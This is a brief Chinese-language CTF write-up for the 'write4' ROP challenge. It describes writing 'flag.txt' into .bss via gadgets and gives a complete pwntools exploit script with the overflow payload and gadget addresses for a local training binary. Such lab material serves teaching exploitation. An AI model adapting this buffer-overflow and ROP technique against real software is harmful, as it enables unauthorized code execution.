# write4

> 我们要调用print_file('flag.txt')  

1. 与32位差不多，把bss首地址弹到r14，'flag.txt'弹到r15，然后把r15的内容传递到r14的地址，即bss首地址；  

2. 然后把bss+8弹到r14，'\0'弹到r15，然后把r15的内容传递到r14的地址，即bss+8；

3. 最后把bss首地址弹到rdi作为print_file()的参数，调用print_file即可。

Exp:
```python
import pwn

pwn.context(arch='amd64', os='linux', log_level='debug')

p = pwn.process('./write4')
e = pwn.ELF('./write4')
libwrite4 = pwn.ELF('./libwrite4.so')

print_file_addr = pwn.p64(e.plt['print_file'])

bss_addr = e.bss()       # bss addr
pop_rdi_addr = pwn.p64(0x400693)         # pop rdi ; ret
pop_r14_r15_addr = pwn.p64(0x400690)     # pop r14 ; pop r15 ; ret
mov_r15__r14__addr = pwn.p64(0x400628)   # mov %r15, (%r14) ; ret

'''
for k, v in e.sym.items():
    print(k, hex(v))
'''

payload = b'A' * 0x20 + b'B' * 8 + pop_r14_r15_addr + pwn.p64(bss_addr) + b'flag.txt' + mov_r15__r14__addr
#                                               # pop bss_addr to r14  | pop 'flag.txt' to r15  | mov r15 to (%r14) -> bss_addr
payload += pop_r14_r15_addr + pwn.p64(bss_addr + 8) + pwn.p64(0) + mov_r15__r14__addr
#                            # pop bss+8 to r14  | pop '\0' to r15  | mov r15 to (%r14) -> bss+8
payload += pop_rdi_addr + pwn.p64(bss_addr) + print_file_addr + b'RRRR'
                    # pop bss_addr to rdi  | call print_file()                  
p.sendlineafter(b'> ', payload)

p.recv()
```